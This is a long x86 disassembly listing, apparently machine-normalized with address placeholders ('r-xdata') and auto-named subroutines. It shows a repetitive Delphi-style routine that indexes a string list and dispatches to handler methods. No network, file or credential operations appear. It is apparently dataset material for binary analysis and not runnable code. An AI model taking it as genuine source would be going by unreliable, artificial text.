call sub_408d28
mov eax [ ebp - 0x18c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x19c ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x19c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
lea ecx [ ebp - 0x1ac ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x1ac ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x1a4 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x1a8 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1a8 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x1a0 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
lea ecx [ ebp - 0x14 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x1cc ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1cc ]
push eax
lea eax [ ebp - 0x1d0 ]
push eax
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_4044fc
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_404418
mov eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_4044fc
inc eax
push eax
mov eax [ ebp - 0x14 ]
call sub_4041b8
mov ecx eax
mov eax [ ebp - 0x14 ]
pop edx
call sub_404418
mov eax [ ebp - 0x1d4 ]
push eax
lea ecx [ ebp - 0x1d8 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x1d8 ]
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x1dc ]
push eax
lea ecx [ ebp - 0x1e0 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1e0 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x1e4 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1e4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x1dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x192 ] 0x0
je r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x1ec ]
push eax
lea ecx [ ebp - 0x1f0 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1f0 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x1f4 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1f4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x1ec ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
push esi
push r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
lea ecx [ ebp - 0x1fc ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x200 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x200 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x1f8 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x204 ]
push eax
lea ecx [ ebp - 0x208 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x208 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x20c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x20c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x204 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x68 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x68 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
lea ecx [ ebp - 0x6c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x6c ]
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
jmp r-xdata
lea ecx [ ebp - 0x70 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x70 ]
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x78 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x7c ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x74 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0xac ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xac ]
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] 0xb
lea ecx [ ebp - 0xb0 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x9c ] 0xb
lea ecx [ ebp - 0xb4 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xb4 ]
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] 0xb
lea ecx [ ebp - 0xb8 ]
mov edx 0x6
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x8c ] 0xb
lea ecx [ ebp - 0xbc ]
mov edx 0x7
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xbc ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] 0xb
lea edx [ ebp - 0xa8 ]
mov ecx 0x4
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x80 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0xdc ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xdc ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] 0xb
lea ecx [ ebp - 0xe0 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xe0 ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xcc ] 0xb
lea ecx [ ebp - 0xe4 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xe4 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xc4 ] 0xb
lea edx [ ebp - 0xd8 ]
mov ecx 0x2
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0xc0 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0xec ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xec ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0xf0 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xf0 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0xe8 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0xf8 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] 0xb
lea ecx [ ebp - 0xfc ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0xfc ]
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x9c ] 0xb
lea ecx [ ebp - 0x100 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x100 ]
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] 0xb
lea ecx [ ebp - 0x104 ]
mov edx 0x6
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x104 ]
mov [ ebp - 0x90 ] eax
mov [ ebp - 0x8c ] 0xb
lea ecx [ ebp - 0x108 ]
mov edx 0x7
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x108 ]
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] 0xb
lea edx [ ebp - 0xa8 ]
mov ecx 0x4
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0xf4 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x10c ]
push eax
lea ecx [ ebp - 0x110 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x110 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x114 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x114 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x10c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x11c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x11c ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] 0xb
lea ecx [ ebp - 0x120 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x120 ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xcc ] 0xb
lea ecx [ ebp - 0x124 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x124 ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xc4 ] 0xb
lea edx [ ebp - 0xd8 ]
mov ecx 0x2
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x118 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x12c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x12c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x130 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x130 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x128 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp - 0x138 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x138 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x13c ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x13c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x134 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
mov eax [ ebx + 0x2c0 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor eax eax
mov [ ebx + 0x2c4 ] eax
push 0x0
push 0x0
mov ecx [ ebx + 0x2c0 ]
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
lea eax [ ebp - 0x140 ]
push eax
lea ecx [ ebp - 0x144 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x144 ]
mov [ ebp - 0xd8 ] eax
mov [ ebp - 0xd4 ] 0xb
lea ecx [ ebp - 0x148 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x148 ]
mov [ ebp - 0xd0 ] eax
mov [ ebp - 0xcc ] 0xb
lea ecx [ ebp - 0x14c ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14c ]
mov [ ebp - 0xc8 ] eax
mov [ ebp - 0xc4 ] 0xb
lea edx [ ebp - 0xd8 ]
mov ecx 0x2
mov eax r-xdata
call sub_408d28
mov edx [ ebp - 0x140 ]
mov eax [ ebx + 0x2c0 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x2c0 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi [ ebx + 0x2c4 ]
sub eax esi
cmp eax 0x28
jne r-xdata
add eax 0xfffffef7
sub eax 0x2
jb r-xdata
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp eax 0xd0
jg r-xdata
cmp esi 0x1b1
jg r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x278 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x278 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x268 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x268 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
dec eax
je r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x21c ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x21c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x220 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x220 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x224 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x224 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x228 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x228 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x22c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x22c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x230 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x230 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x234 ]
push eax
lea ecx [ ebp - 0x238 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x238 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x23c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x23c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x234 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
mov edx 0x3
mov eax ebx
call sub_470494
jmp r-xdata
lea ecx [ ebp - 0x15c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x15c ]
mov eax [ ebx + 0x2e0 ]
call sub_46ba6c
push eax
lea ecx [ ebp - 0x160 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x160 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
push [ ebp - 0x14 ]
push r-xdata
lea ecx [ ebp - 0x158 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x158 ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404278
lea ecx [ ebp - 0x168 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x168 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x174 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x174 ]
push eax
lea ecx [ ebp - 0x178 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x178 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebx + 0x2e4 ]
mov edx ebx
mov eax [ ebx + 0x194 ]
call [ ebx + 0x190 ]
jmp r-xdata
push esi
push r-xdata
push r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
push esi
push 0x0
mov ecx [ ebx + 0x2c0 ]
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
mov eax [ ebx + 0x2c0 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x2c4 ] eax
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
sub eax 0x22
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
add eax 0xffffff0f
sub eax 0x4
jb r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x48 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
lea ecx [ ebp - 0x4c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea edx [ ebp - 0x38 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d28
mov eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
add eax 0xffffff2d
sub eax 0x6
jb r-xdata
je r-xdata
cmp [ ebx + 0x10c ] 0x3
jne r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x26c ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x26c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0x154 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0x154 ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c8 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x1c8 ]
call sub_4041b8
test eax eax
jg r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x5c ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x5c ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
lea ecx [ ebp - 0x60 ]
mov edx 0x4
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x10 ]
add eax 0x1c
call sub_403f4c
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
jmp r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
add eax 0xfffffffb
sub eax 0x6
jb r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
dec eax
sub eax 0x4
jb r-xdata
mov eax [ ebx + 0x110 ]
mov edx [ ebx + 0xe8 ]
call sub_404304
jne r-xdata
push esi
push r-xdata
lea ecx [ ebp - 0x270 ]
mov edx 0x2
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x270 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
lea ecx [ ebp - 0x1b0 ]
mov edx 0x5
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x1b0 ]
mov eax r-xdata
call sub_4044fc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
jmp r-xdata
push esi
push r-xdata
mov eax [ ebx + 0x2dc ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
